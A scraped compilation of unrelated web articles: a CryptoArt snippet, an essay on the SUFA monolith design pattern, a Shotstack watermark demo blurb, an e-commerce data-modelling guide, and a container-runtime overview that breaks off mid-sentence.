<li><b><i>Dankness</i></b><span>: Because CryptoArt is open to everyone, judging it by traditional artistic standards kills what is great about it. Instead, it is best to judge CryptoArt by “dankness” or potency of expression and creativity.&nbsp;&nbsp;</span></li>
</ul>
<p><span>CryptoArtists are made up of two kinds of people: tech-savvy and self-trained artists.&nbsp;</span></p>
<p><a href="https://dada.nyc/home"><span>Dada.nyc</span></a><span> is a digital platform that allows anyone to create and share artwork that can be bought and sold via the blockchain. Dada.nyc was created by Beatriz Helena Ramos or “Bea.”</span></p>
<p><span>“You can’t talk about CryptoArt without talking about Rare Pepes. The Rare Pepe meme is the real origin of much of CryptoArt’s culture, aesthetic, and technology.” — Jason Bailey</span></p>
<p><span>Traditional art lacks the use cases of CryptoArt. With CryptoArt the sky’s the limit. It can include music, video games, and goods that are usable in other games.</span></p>
								</div>
								<p><img src="https://gradually.co/wp-content/themes/gradually/img/two-cents.png">
								</p><!-- end half sqaure arrow -->
								<p><b><i>My two cents</i></b><span>: CryptoArt and cryptocurrencies are really fascinating to me. Although I don’t know anything about the technical side of crypto (like how the blockchain works), it’s interesting to think about the power of decentralization across different industries. Time will tell, but keep an eye on this space as it’s only rising in popularity. &nbsp; </span></p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="text"><h2 id="the-monolith-gets-a-bad-rap">The monolith gets a bad rap</h2>
<p>When you hear that a company runs a monolith, you may think they're old-fashioned and they must have trouble scaling it, right? I'm here to tell you that <a target="_blank" href="https://m.signalvnoise.com/the-majestic-monolith/">some people</a> (myself included) think monoliths are awesome for a whole lot of teams. That said, technology has advanced, and I truly think it's time to revisit the monolith with a new approach.</p>
<p>If you're new to back-end development, a monolith is a server-side system that runs as one.... thing. It's a single program that starts up, serves some network requests, and then terminates. Alternatives to 'the monolith' include service-oriented architectures (SOA), microservices, serverless functions, and probably a few that I haven't heard of. Each of these approaches has their time and place, and I salute anyone who has made an educated decision to build a system with these patterns. I'm of the opinion that a large number of web applications and services would be well served by a monolith.... but with some upgrades.</p>
<h2 id="you-need-some-services-to-lighten-the-load">You need some services to lighten the load</h2>
<p>The reasoning behind the alternative design patterns is very sound. By distributing the work among many different “things”, you make the system as a whole able to handle more. It is well known that by doing so, you introduce more complexity, which requires more effort, and therefore often more people-power and more money. The one possible exception I can see is serverless functions, which do indeed simplify many things, but whose downsides comes in the form of more difficult testing, vendor dependence, or the need for non-commodity tooling. When done right, the extra effort can lead to a very capable system whose benefits are truly remarkable. The classic example is Netflix, and they’ve done very well for themselves.</p>
<h2 id="finding-a-middle-ground">Finding a middle ground</h2>
<p>If monoliths are hard to scale and microservices are too complex, then how do you design a system that can scale with your traffic and your development team without becoming a pain to operate, maintain and expand its functionality? Over the past few years, it has become clear that a middle-ground is needed. I don’t expect this solution to work for everyone, but most products aren’t serving the kind of traffic that <strong>really</strong> makes the microservice effort worth it.</p>
<h2 id="enter-the-sufa-design-pattern">Enter the SUFA design pattern</h2>
<p>Before getting into the core of what SUFA is, I want to mention that this is not an entirely new way of thinking. Things like the actor pattern, the <a target="_blank" href="https://inconshreveable.com/10-07-2015/the-neomonolith/">Neomonolith</a>, and others have stipulated some similar ideas over the years, and SUFA is just one way of combining several concepts into one straightforward design pattern. So, what is it?</p>
<p><strong>Simple, Unified, Function-based Applications.</strong></p>
<p>Let’s break that down:</p>
<h3 id="simple">Simple</h3>
<p>A system designed with SUFA can be run in the simplest of deployment scenarios. Auto-scaling groups have existed for a long time, and they’re made even easier by container orchestration systems. A SUFA system can be run on one ASG, or can be expanded with a service mesh to allow for capability groups (which we’ll talk about in a future post).</p>
<h3 id="unified">Unified</h3>
<p>Rather than multiple services who each exist as something to be deployed, SUFA systems exist as one single deployable. This can be a Docker image, an AMI, or some other artifact, but there is only one <strong>thing</strong> that needs to be built. It should be built by CI/CD on a continuous or tagged release cadence, and it should be made available in an artifact registry such as a Docker registry or S3 bucket. </p>
<h3 id="function-based">Function-based</h3>
<p>A standard monolith probably includes a handler layer which is responsible for taking API requests and making calls to a business logic or data storage layer to handle those requests. SUFA systems instead handle requests by chaining together a series of functions, each completely independent and unaware of one another. Functions should expect a particular input, perform some operations, and produce an output to be passed into functions further down the chain. Functions should be easily testable and reusable across different scenarios (such as for different API requests). SUFA systems should also be designed to consume and produce event-based traffic as a primary method of communication.</p>
<h3 id="applications">Applications</h3>
<p>Well this seems like it should be straightforward, but in SUFA design, “Application” has a very particular meaning. A SUFA system should serve one single application, meaning that it should encompass all of the capabilities needed for a fully formed product. This can be up for some interpretation (such as whether a company should have one SUFA for their whole business, even if they have distinct product areas), but the point is to avoid having multiple “things” serving one application. If functionality needs to be shared across multiple applications, the functions comprising the SUFA system should be easily reusable and composed for other purposes. </p>
<p>You'll notice that this is all very technology-agnostic and vendor-agnostic. SUFA is meant to span across languages, cloud vendors, and deployment environments. SUFA is a way of designing your server-side system such that it is testable, scalable, and secure. You'll notice I haven't touched on scalability yet, so let's discuss that</p>
<h2 id="sufa-at-scale">SUFA at scale</h2>
<p>The critical factor that allows a SUFA system to scale is that it is composed of independent functions. SUFA systems should rely on an underlying framework to orchestrate the execution of these functions such that it can scale effectively. By using a function runner or job scheduler to run the required functions, a SUFA framework abstracts away <em>how</em> the functions are executed, and the programmer writing the code only needs to indicate which functions to run, and in what order.</p>
<p>Additional scalability is provided by <strong>capability groups</strong> and <strong>meshing</strong>, which I plan on writing follow-up posts for, as they deserve to be explored at length.</p>
<h2 id="suborbital-atmo">Suborbital Atmo</h2>
<p>The SUFA pattern was designed in concert with <a target="_blank" href="https://github.com/suborbital/atmo">Atmo</a>, which is an all-in-one framework upon which SUFA systems can be built. Atmo uses a file known as a 'Directive' to describe all aspects of your application, including how to chain functions to handle requests. You can write your functions using several languages to be run atop Atmo, as it is built to use WebAssembly modules as the unit of compute. Atmo will automatically scale out to handle your application load, and includes all sorts of tooling and built-in best practices to ensure you're getting the best performance and security without needing to write a single line of boilerplate ever again.</p>
<p>The awesome capabilities of WebAssembly and the design thinking behind SUFA are being harnessed by the open source <a target="_blank" href="https://suborbital.dev/">Suborbital Development Platform</a> to introduce a new way to build your web applications. I've been working for over a year to realize this goal, and I'm extremely happy with the results thus far. Riding the wave of new technologies and practices such as JAMStack and edge computing means that we have a opportunity to bring the best of the old and the new to the next generation of software makers to do incredible things. I hope you'll come and join me!</p>

                <h3>About the video watermark demo</h3>
                <p>
                    This demo application shows how you can build an interface to apply a watermark to a video using the
                    <a href="https://shotstack.io/">Shotstack</a> cloud video editing API. The form prepares the video, 
                    watermark and watermark settings and posts the required parameters to the Shotstack API which takes
                    care of rendering the video.
                </p>
                <p>
                    This demo is provided as 
                    <a href="https://github.com/shotstack/watermark-demo" target="_blank">open source</a> code so you 
                    can use it as is, adapt it to your own needs or use it as the basis to build a fully automated 
                    video watermark application that can apply a watermark to 1000's of videos as part of an automated
                    workflow. Our <a href="https://shotstack.io/learn/add-watermarks-to-your-videos-using-code/">How to watermark video tutorial</a>

Most off-the-shelf providers like Shopify and BigCommerce are built for small stores selling a few million dollars in orders per month, so many e-commerce retailers working at scale start to investigate creating a bespoke solution.</p>
<!--more-->
<p>This article will look at what it takes to start building this infrastructure on your own. What are some of the areas to consider? What might the data model look like? How much work is involved?</p>
<p>Along the way, we’ll explore an alternative: API-based commerce platforms that manage data for you across product catalogs, pricing, and orders—without locking you into a monolith, and without requiring you to replatform.</p>
<p><em><strong>Note:</strong> A full summary diagram of the e-commerce data model is at the end of the article.</em></p>

<h2 id="who-are-your-customers-">Who Are Your Customers?</h2>
<p>First, you need to consider <em>who</em> will be purchasing items from your e-commerce application. How might you model customer information in a database as a result? You’ll probably want to have basic information like your customer's name, email address, etc. Do you want your customers to be able to create a profile in your system? Or just fill out a form each time they want to purchase something?</p>
<p>Just starting out, a basic model might look like this:</p>

<p>If you want your customers to have a persistent profile, then you need to build some way for them to log in to your application. Moving forward with more real-world requirements, you might also want to keep track of their login attempt history and password history.</p>
<p><img src="https://resources.fabric.inc/hs-fs/hubfs/More%20complex%20e-commerce%20customer%20data%20model.png?width=891&amp;name=More%20complex%20e-commerce%20customer%20data%20model.png" alt="More complex e-commerce customer data model" width="891" srcset="https://resources.fabric.inc/hs-fs/hubfs/More%20complex%20e-commerce%20customer%20data%20model.png?width=446&amp;name=More%20complex%20e-commerce%20customer%20data%20model.png 446w, https://resources.fabric.inc/hs-fs/hubfs/More%20complex%20e-commerce%20customer%20data%20model.png?width=891&amp;name=More%20complex%20e-commerce%20customer%20data%20model.png 891w, https://resources.fabric.inc/hs-fs/hubfs/More%20complex%20e-commerce%20customer%20data%20model.png?width=1337&amp;name=More%20complex%20e-commerce%20customer%20data%20model.png 1337w, https://resources.fabric.inc/hs-fs/hubfs/More%20complex%20e-commerce%20customer%20data%20model.png?width=1782&amp;name=More%20complex%20e-commerce%20customer%20data%20model.png 1782w, https://resources.fabric.inc/hs-fs/hubfs/More%20complex%20e-commerce%20customer%20data%20model.png?width=2228&amp;name=More%20complex%20e-commerce%20customer%20data%20model.png 2228w, https://resources.fabric.inc/hs-fs/hubfs/More%20complex%20e-commerce%20customer%20data%20model.png?width=2673&amp;name=More%20complex%20e-commerce%20customer%20data%20model.png 2673w" sizes="(max-width: 891px) 100vw, 891px"></p>
<p>You might also want to consider whether your customers are part of a large organization; and, if so, how would they like to handle password resets? Do they need single sign-on or OAuth support?</p>
<h4 id="deep-dive-addresses">Deep Dive: Addresses</h4>
<p>Did you notice there’s no address tied to a customer in any of the data models shown so far? It might be your first inclination to include a customer’s address as part of those models. However, most customers will have multiple addresses and multiple <em>kinds</em> of addresses, like billing and shipping. B2B retailers might also have to consider multiple delivery locations based on the number of warehouses and offices they support.</p>
<p>What happens if the billing and shipping address are different? Well, you’ll need to do more than just add extra columns to the <code>Customer</code> table! It’s not that simple.</p>
<p>So how <em>does</em> storing a billing address affect the scalability of your application?</p>
<p>If you were to split the payment and shipping areas into separate (micro)services each having their own database, then putting billing and payment addresses into the <code>Customer</code> area would lead to having “chatty” services. This is a <a href="https://docs.aws.amazon.com/whitepapers/latest/microservices-on-aws/chattiness.html" rel="noopener" target="_blank">well-known <em>design smell</em> when building microservices</a>.</p>
<p>To avoid this issue, you’re better off putting the addresses within the appropriate area/service that requires them, but with that, your data model becomes more complex.</p>
<p>One way to avoid much of this complexity is to consider an <a href="https://resources.fabric.inc/glossary/oms-software" rel="noopener">order management system (OMS)</a> by an API-first software provider. With this software, you can integrate the OMS into your data model without spending months of engineering time.</p>

<h2 id="how-do-you-organize-products-and-catalog-">How Do You Organize Products And Catalog?</h2>
<p>The first thing you see when you enter a store (either in-person or digitally) are products ready for you to purchase, and usually displayed with some thought for how you might be likely to shop.</p>
<p>For an e-commerce web application, you will probably want to highlight things like:</p>
<ul>
<li>Best selling products</li>
<li>Trending products</li>
<li>New products</li>
<li>The ability to browse products by search criteria</li>
</ul>
<p>Providing customers with that information means you first need to keep track of a lot of data about your products: their prices, historical purchase data, and so on.</p>
<p>Let’s see what a “first shot” at creating a data model for a product catalog might look like:</p>
<p><img src="https://resources.fabric.inc/hs-fs/hubfs/Simple%20e-commerce%20product%20data%20model.png?width=562&amp;name=Simple%20e-commerce%20product%20data%20model.png" alt="Simple e-commerce product data model" width="562" srcset="https://resources.fabric.inc/hs-fs/hubfs/Simple%20e-commerce%20product%20data%20model.png?width=281&amp;name=Simple%20e-commerce%20product%20data%20model.png 281w, https://resources.fabric.inc/hs-fs/hubfs/Simple%20e-commerce%20product%20data%20model.png?width=562&amp;name=Simple%20e-commerce%20product%20data%20model.png 562w, https://resources.fabric.inc/hs-fs/hubfs/Simple%20e-commerce%20product%20data%20model.png?width=843&amp;name=Simple%20e-commerce%20product%20data%20model.png 843w, https://resources.fabric.inc/hs-fs/hubfs/Simple%20e-commerce%20product%20data%20model.png?width=1124&amp;name=Simple%20e-commerce%20product%20data%20model.png 1124w, https://resources.fabric.inc/hs-fs/hubfs/Simple%20e-commerce%20product%20data%20model.png?width=1405&amp;name=Simple%20e-commerce%20product%20data%20model.png 1405w, https://resources.fabric.inc/hs-fs/hubfs/Simple%20e-commerce%20product%20data%20model.png?width=1686&amp;name=Simple%20e-commerce%20product%20data%20model.png 1686w" sizes="(max-width: 562px) 100vw, 562px"></p>
<p>Here’s a <code>Product</code> table with some basic information, like a product’s name, SKU, and price. The product is also linked to another table representing various categories that product is associated with. You might also strategically add indexes and full-text search to the <code>Product</code> table to enable site visitors to efficiently search for various products.</p>
<p>This is a decent first attempt. However, to get an even more realistic and useful e-commerce product catalog, you’ll need to support more requirements such as:</p>
<ul>
<li>Tracking pricing history so site administrators can analyze trends in product pricing</li>
<li>Supporting related products to display on a product’s page</li>
<li>Incorporating product vendors so customers can view all products sold by an individual vendor/company</li>
</ul>
<p>To address those extra requirements, you might end up with the following data model:</p>
<p><img src="https://resources.fabric.inc/hs-fs/hubfs/More%20complex%20e-commerce%20product%20data%20model.png?width=816&amp;name=More%20complex%20e-commerce%20product%20data%20model.png" alt="More complex e-commerce product data model" width="816" srcset="https://resources.fabric.inc/hs-fs/hubfs/More%20complex%20e-commerce%20product%20data%20model.png?width=408&amp;name=More%20complex%20e-commerce%20product%20data%20model.png 408w, https://resources.fabric.inc/hs-fs/hubfs/More%20complex%20e-commerce%20product%20data%20model.png?width=816&amp;name=More%20complex%20e-commerce%20product%20data%20model.png 816w, https://resources.fabric.inc/hs-fs/hubfs/More%20complex%20e-commerce%20product%20data%20model.png?width=1224&amp;name=More%20complex%20e-commerce%20product%20data%20model.png 1224w, https://resources.fabric.inc/hs-fs/hubfs/More%20complex%20e-commerce%20product%20data%20model.png?width=1632&amp;name=More%20complex%20e-commerce%20product%20data%20model.png 1632w, https://resources.fabric.inc/hs-fs/hubfs/More%20complex%20e-commerce%20product%20data%20model.png?width=2040&amp;name=More%20complex%20e-commerce%20product%20data%20model.png 2040w, https://resources.fabric.inc/hs-fs/hubfs/More%20complex%20e-commerce%20product%20data%20model.png?width=2448&amp;name=More%20complex%20e-commerce%20product%20data%20model.png 2448w" sizes="(max-width: 816px) 100vw, 816px"></p>
<p>This model still isn’t perfect as it embeds your prices into the product itself, but at least it lets you maintain a previous pricing history.</p>
<p>Another option is to integrate your e-commerce store with a <a href="https://resources.fabric.inc/glossary/promotions-engine" rel="noopener">pricing and promotions engine</a> from an API-first software provider that handles pricing for you. This will let you roll out different prices to different users based on their intent, location, cart, or order history.</p>
<h4 id="deep-dive-pricing">Deep Dive: Pricing</h4>
<p>While the more complex product data model still has a product’s price in the same table, this may not be the best thing to do in a real large-scale application.</p>
<p>Consider that your organization has various departments, such as inventory/warehousing, sales, marketing, customer support, etc. You might have dedicated systems that allow merchandisers to change the price of an item since they are the experts in determining how much a product should sell for. Similar to the considerations with a customer’s billing and shipping addresses, this would lead to cross-boundary/service communication if we left the price in the core <code>Product</code> table.</p>
<p>Therefore, you might want to store product prices under the data stores that the sales department owns. But don’t forget, there are many different kinds of “prices” that haven’t been taken into consideration yet, including:</p>
<ul>
<li>Price (cost) when purchasing stock from vendors</li>
<li>Customer sale price</li>
<li>Discounted sale prices</li>
<li>Manufacturer’s suggested retail price</li>
</ul>
<p>Handling all these in context of your organizational structure would require even more exploration and complexity in your data model. While your engineering team could likely accomplish this task, it’s going to take time. Using ready-made solutions can shave weeks or months off your e-commerce data modeling timeline.</p>

<h2 id="how-do-you-streamline-orders-">How Do You Streamline Orders?</h2>
<p>Now that you have customers in your database and products available to purchase, you’ll need to think about how to design the order-taking process and data model.</p>
<p>The process of placing an order might look something like this:</p>
<ol>
<li>A customer places products into their cart while browsing.</li>
<li>The customer decides they want to purchase the products that are in their cart.</li>
<li>They proceed to purchase the order.</li>
<li>The customer gets an emailed receipt or confirmation number.</li>
</ol>
<p>However, it’s rarely so simple. Placing orders can be deceptively tricky as there are many moving parts:</p>
<ul>
<li>Products</li>
<li>An active cart</li>
<li>Cart converted into an order</li>
<li>A finalized order with confirmation</li>
</ul>
<p>If you were to look at a simple data model for an order placement, it might look something like this:</p>
<p><img src="https://resources.fabric.inc/hs-fs/hubfs/Orders%20data%20model.png?width=837&amp;name=Orders%20data%20model.png" alt="Orders data model" width="837" srcset="https://resources.fabric.inc/hs-fs/hubfs/Orders%20data%20model.png?width=419&amp;name=Orders%20data%20model.png 419w, https://resources.fabric.inc/hs-fs/hubfs/Orders%20data%20model.png?width=837&amp;name=Orders%20data%20model.png 837w, https://resources.fabric.inc/hs-fs/hubfs/Orders%20data%20model.png?width=1256&amp;name=Orders%20data%20model.png 1256w, https://resources.fabric.inc/hs-fs/hubfs/Orders%20data%20model.png?width=1674&amp;name=Orders%20data%20model.png 1674w, https://resources.fabric.inc/hs-fs/hubfs/Orders%20data%20model.png?width=2093&amp;name=Orders%20data%20model.png 2093w, https://resources.fabric.inc/hs-fs/hubfs/Orders%20data%20model.png?width=2511&amp;name=Orders%20data%20model.png 2511w" sizes="(max-width: 837px) 100vw, 837px"></p>
<p>Notice that each row in the <code>ShoppingCartItem</code> table contains the “captured” price of the product. When the customer puts an item into their shopping cart should the price at that moment be “locked-in”? If so, for how long?</p>
<p><em><span>Note:</span> How the price functions is a business requirement that would need to be discussed with your product owners, and so on, as mentioned in the "Deep Dive: Pricing" section earlier.</em></p>
<p>The same question applies to an unpaid order. If a customer has ordered a discounted item, should they be able to keep the promise of that discounted price forever until they pay? Or does it expire?</p>
<p>Other questions to consider for an orders data model might include:</p>
<ul>
<li>Are you tracking analytics on orders?</li>
<li>What happens if a customer returns a defective item?</li>
<li>Should you handle shipping within the same data model or have a dedicated shipping context/schema?</li>
</ul>
<p>With some of these concerns in mind, you might end up with a data model that looks more like this:</p>
<p><img src="https://resources.fabric.inc/hs-fs/hubfs/More%20complex%20orders%20data%20model.png?width=1112&amp;name=More%20complex%20orders%20data%20model.png" alt="More complex orders data model" width="1112" srcset="https://resources.fabric.inc/hs-fs/hubfs/More%20complex%20orders%20data%20model.png?width=556&amp;name=More%20complex%20orders%20data%20model.png 556w, https://resources.fabric.inc/hs-fs/hubfs/More%20complex%20orders%20data%20model.png?width=1112&amp;name=More%20complex%20orders%20data%20model.png 1112w, https://resources.fabric.inc/hs-fs/hubfs/More%20complex%20orders%20data%20model.png?width=1668&amp;name=More%20complex%20orders%20data%20model.png 1668w, https://resources.fabric.inc/hs-fs/hubfs/More%20complex%20orders%20data%20model.png?width=2224&amp;name=More%20complex%20orders%20data%20model.png 2224w, https://resources.fabric.inc/hs-fs/hubfs/More%20complex%20orders%20data%20model.png?width=2780&amp;name=More%20complex%20orders%20data%20model.png 2780w, https://resources.fabric.inc/hs-fs/hubfs/More%20complex%20orders%20data%20model.png?width=3336&amp;name=More%20complex%20orders%20data%20model.png 3336w" sizes="(max-width: 1112px) 100vw, 1112px"></p>
<p>Some things to take note of in this more complex orders model:</p>
<ul>
<li><code>ShoppingCartItem</code> now supports an expiration date for a locked-in price.</li>
<li><code>ShoppingCartHistory</code> tracks when items are added, removed, etc.</li>
<li>An order item may be returned (this still does not handle cases where 1 out of X items of the same product are returned).</li>
<li>An order may have multiple shipments (eg, how Amazon will sometimes split an order up into multiple packages/shipments).</li>
</ul>
<p>This article also hasn’t even touched the surface of using alternative data storage methods like JSON documents or event sourcing!</p>

<h2 id="conclusion">Conclusion</h2>
<p>To help you see how all the pieces fit together, here are all the diagrams shown together. I’ve removed a number of links/lines to the <code>Customer</code> table to increase readability:</p>

<p>As I mentioned above, this article still doesn’t even cover many of the basics like payment processing and invoicing. Beyond the features covered here, you might eventually require more advanced features like:</p>
<ul>
<li>Coupon codes</li>
<li>Taxes</li>
<li>Third-party integrations with OAuth providers, other retailers, or partners</li>
<li>Shipment tracking notifications</li>
</ul>
<p>Building a data model for an e-commerce application, as you can see, is not so simple. What looks up front to be a straightforward set of database tables is not so simple once you dig into real-world requirements.</p>

Well, you’ve probably settled for Kubernetes, but have you thought about alternative container runtimes to use within? My goal is to give a comprehensive, mid-level sightseeing flight over the jungle that keeps growing every day. Low enough for you to probably spot some details on the ground and learn some technicalities, but high enough not to crash and burn next to, say, a big Docker palm tree. I’m really liking this analogy.<span id="more-18384"></span></p><p>This post is divided into three parts, the first of which you can skip if you’re familiar with OCI, CRI, CNI and already know about the complexity the term “container runtime” has. The second part describes classic container runtimes, the third takes a look at VM-like and otherwise “special” runtimes. Finally, in the conclusion, I’ll summarize my findings, so head there if you’re looking for an executive summary.</p><h2>Part One: Foundations</h2><p>To better navigate the jungle that is the current container landscape, we’ll have a brief look at standardization efforts that have been made in recent years.</p><h3>The Open Container Initiative</h3><p>Formed in 2015 by Docker, CoreOS and others, the Open Container Initiative’s (OCI) mission is to create open industry standards around container formats and runtimes. If a container runtime is OCI-compliant, it means that it implements specifications the OCI defines: Namely the <a href="https://github.com/opencontainers/image-spec">image-spec</a> and/or the <a href="https://github.com/opencontainers/runtime-spec">runtime-spec</a>. The former defines an interoperable format to build, transport and prepare a container image to run; the latter describes the lifecycle of a running container and how a tool executing such a container must behave and interact with it.</p><p>Additionally, the OCI develops reference implementations for their specifications. I’ll talk about those later. You’ll find more information about the initiative itself on the <a href="https://www.opencontainers.org/">OCI website</a>.</p><h3>The Container Runtime Interface</h3><p>The Container Runtime Interface (CRI) was <a href="https://kubernetes.io/blog/2016/12/container-runtime-interface-cri-in-kubernetes/">introduced in the Kubernetes 1.5 release</a>. Prior to this release, the kubelet (the managing instance of every Kubernetes node) and the runtime responsible for running containers were quite intertwined. This lead to high implementation efforts and wasn’t desirable, since the wishlist of container runtimes for Kubernetes to support was (and still is) growing.</p><p>With the CRI, the Kubernetes developers created a well-defined interface to develop container runtimes against. If a certain container runtime implements the CRI, it is able to be used with Kubernetes. If you’re interested in the (surprisingly concise) API itself, check out the <a href="https://github.com/kubernetes/cri-api">CRI codebase</a>.</p><h3>The Container Network Interface</h3><p>Our last three-letter acronym in this foundation part: Container Network Interface (CNI). It belongs to the CNCF (Cloud Native Computing Foundation) and defines how connectivity among containers as well as between the container and its host can be achieved. The CNI is not concerned with the properties or architecture of the container itself, which makes it narrow-focused and simple to implement. This statement is supported by the list of organizations and enterprises that committed themselves to the CNI for their projects: Kubernetes, OpenShift, Cloud Foundry, Amazon ECS, Calico and Weave, to name a few. Find the <a href="https://github.com/containernetworking/cni">CNI and a more extensive list on GitHub</a>.</p><h3>Disambiguating The Term “Container Runtime”</h3><p>By now, I have used the term “container runtime” a lot. Bear with me, it’s going to appear quite a bit throughout. For this post, I want to clarify what I mean by it, because it is an overloaded term. Ian Lewis dedicated a <a href="https://www.ianlewis.org/en/container-runtimes-part-1-introduction-container-r">four-part blog series</a> to this topic, I recommend you check it out. The gist of the series: On the one hand, there are low-level container runtimes that literally run a container. These might implement the OCI runtime spec. On the other hand, there are high-level container runtimes that bundle a lot of additional functionality. Think of building and unpacking images, saving and sharing them, and providing a CLI for interaction.</p><p>These definitions of high-level and low-level container runtimes are not standardized, but they help when categorizing different projects. As we’ll see, high-level runtimes often incorporate low-level runtimes that are otherwise standalone projects.</p><p>To summarize the foundation part: If tomorrow you get the urge to add your own container project to the ever-growing jungle, you should make it OCI-, CRI- and CNI-compliant. These are the dominating standards for containerization and shape the development of both cloud and local applications of containers at the time.</p><h2>Part Two: Classic Container Runtimes</h2><p>Enough with the acronyms. Let’s see how they apply to the real world and what runtimes are out there. I’ll start with classic container runtimes, in the sense that all of these use the technology commonly referred to as containerization: Using a common host, and separating containers with Linux tools like namespaces and cgroups.</p><h3>Docker</h3><p>Let’s start with Docker, as it’s the container runtime most people know. In fact, I think Docker profited somewhat from the <a href="https://www.businessinsider.com/kleenex-jacuzzi-generic-names-2016-10">Kleenex effect</a>, where a brand name is genericized—in this case, some people tend to think that <em>Docker equals container</em>. This is not the case, it was just one of the earlier famous solutions for containerization. When it initially came out in 2013, Docker was a monolithic software that had all the qualities of a high-level container runtime.</p><p>With standardization efforts being pushed by individuals as well as companies like Docker Inc. itself, the Docker ecosystem changed. Certain functionalities were decoupled and outsourced in standalone projects: <i>containerd</i> became the new high-level daemon for image management, <i>runc</i> emerged as the new low-level container runtime. Today, whenever you use Docker, you actually use a stack consisting of a docker daemon making calls to containerd, which in turn calls runc. Some people have argued that it is not necessary to use Docker altogether; as it just adds an extra step and therefore instability to your container management. In the case of Kubernetes, the difference is shown in figure 1.</p><p><img src="https://www.inovex.de/blog/wp-content/uploads/2020/03/docker_vs_containerd.png" alt="A flowchart of two setups comparing Docker to containerd" width="721" height="225" srcset="https://www.inovex.de/blog/wp-content/uploads/2020/03/docker_vs_containerd-200x62.png 200w, https://www.inovex.de/blog/wp-content/uploads/2020/03/docker_vs_containerd-300x94.png 300w, https://www.inovex.de/blog/wp-content/uploads/2020/03/docker_vs_containerd-400x125.png 400w, https://www.inovex.de/blog/wp-content/uploads/2020/03/docker_vs_containerd-600x187.png 600w, https://www.inovex.de/blog/wp-content/uploads/2020/03/docker_vs_containerd.png 721w" sizes="(max-width: 721px) 100vw, 721px" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20721%20225'%3E%3C/svg%3E" data-lazy-srcset="https://www.inovex.de/blog/wp-content/uploads/2020/03/docker_vs_containerd-200x62.png 200w, https://www.inovex.de/blog/wp-content/uploads/2020/03/docker_vs_containerd-300x94.png 300w, https://www.inovex.de/blog/wp-content/uploads/2020/03/docker_vs_containerd-400x125.png 400w, https://www.inovex.de/blog/wp-content/uploads/2020/03/docker_vs_containerd-600x187.png 600w, https://www.inovex.de/blog/wp-content/uploads/2020/03/docker_vs_containerd.png 721w" data-lazy-src="https://www.inovex.de/blog/wp-content/uploads/2020/03/docker_vs_containerd.png"></p><p><span>Figure 1: Docker vs. containerd in a Kubernetes context. The dockershim and cri-containerd implementations make the respective APIs CRI-compliant by translating calls back and forth.</span></p><p>Well, if we get rid of Docker, how do containerd and runc hold up on their own?</p><h3>containerd</h3><p>containerd is a standalone high-level container runtime, able to push and pull images, manage storage and define network capabilities. It is also capable of managing the lifecycle of running containers by passing corresponding commands to a low-level container runtime like runc.</p><p>Depending on your use case, you can talk to containerd directly in a local setup by using ctr, a barebone CLI for communicating with containerd. In Kubernetes, we’ve already seen how containerd can replace a Docker-based setup by using the cri-containerd implementation. Furthermore, containerd fulfills the OCI specification both for images and the runtime (again, in the form of a low-level runtime).</p><p>With the <a href="https://kubernetes.io/docs/concepts/containers/runtime-class/">Kubernetes Runtime Class</a>, it is possible to use containerd as a central high-level container runtime in your cluster, but to allow for multiple low-level container runtimes to be used depending on your requirements (performance and speed vs security and separation). This sort of plugin-based scenario, depicted in figure 2, cannot be achieved with the dockershim we saw earlier.</p><p><img src="https://www.inovex.de/blog/wp-content/uploads/2020/03/multiple_runtimes.png" alt="A flowchart depicting the use of multiple container runtimes" width="721" height="180" srcset="https://www.inovex.de/blog/wp-content/uploads/2020/03/multiple_runtimes-200x50.png 200w, https://www.inovex.de/blog/wp-content/uploads/2020/03/multiple_runtimes-300x75.png 300w, https://www.inovex.de/blog/wp-content/uploads/2020/03/multiple_runtimes-400x100.png 400w, https://www.inovex.de/blog/wp-content/uploads/2020/03/multiple_runtimes-600x150.png 600w, https://www.inovex.de/blog/wp-content/uploads/2020/03/multiple_runtimes.png 721w" sizes="(max-width: 721px) 100vw, 721px" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20721%20180'%3E%3C/svg%3E" data-lazy-srcset="https://www.inovex.de/blog/wp-content/uploads/2020/03/multiple_runtimes-200x50.png 200w, https://www.inovex.de/blog/wp-content/uploads/2020/03/multiple_runtimes-300x75.png 300w, https://www.inovex.de/blog/wp-content/uploads/2020/03/multiple_runtimes-400x100.png 400w, https://www.inovex.de/blog/wp-content/uploads/2020/03/multiple_runtimes-600x150.png 600w, https://www.inovex.de/blog/wp-content/uploads/2020/03/multiple_runtimes.png 721w" data-lazy-src="https://www.inovex.de/blog/wp-content/uploads/2020/03/multiple_runtimes.png"></p><p><span>Figure 2: containerd allows for the usage of multiple low-level container runtimes, which can be used in Kubernetes interchangeably based on the requirements for a specific application. In this case, Kata is used to run untrusted containers. We’ll talk about Kata in detail in part three.</span></p><h3>runc</h3><p>I mentioned earlier that the OCI also provides some reference implementations for their specs. runc is one of them and aims for strict convergence to the OCI runtime-spec. Initially, runc emerged from the Docker project (its previous name was <i>libcontainer</i>) and was donated to the OCI, which has been in charge of it since.</p><p>With its scope being solely focused on managing a running container, runc can be considered a low-level container runtime. It uses the aforementioned namespaces and cgroups to provide isolation. Looking at the <a href="https://github.com/opencontainers/runc">runc GitHub repository</a>, you’ll see it’s implemented as a CLI you can use for spawning and running containers.</p><p>If you want to play around with runc locally, you have to obtain an OCI container image—this can be achieved with Dockers export command. After exporting the image and creating a basic specification for the container, you can use runc directly instead of Docker to run the image.</p><h3>Rocket (rkt)</h3><p>Apart from Docker, rkt was the only container runtime that was integrated within the kubelet directly before CRI was introduced. It was managed by CoreOS, which has been acquired by RedHat. rkt aspired to be a high-level container runtime, while also providing low-level capabilities. <a href="https://github.com/rkt/rkt/issues/4024">As of march 2020, rkt is declared dead</a>. I’ll keep it in here for completeness‘ sake and historic reasons. And, as the EOL announcement states, it is free software that you could continue to use and develop yourself if you wanted.</p><p>rkt had some interesting features; it did not rely on a daemon but rather worked with the “rkt run” command directly, which made it easier to use rkt in combination with systemd. Also, the Kubernetes concept of a pod was directly adopted into rkt.</p><h3>Linux Containers (lxc)</h3><p>Linux Containers (lxc) exist since 2008 and were initially a technology Docker was based on. The concept behind lxc is a Virtual Environment (VE), which is different from a Virtual Machine (VM) in that it doesn’t emulate hardware. VEs run directly on the host and therefore have a performance advantage over traditional VMs.</p><p>lxc can be used in combination with lxd, a container manager daemon that wraps around lxc …</p></div></article></section></div></main></div></div></div>

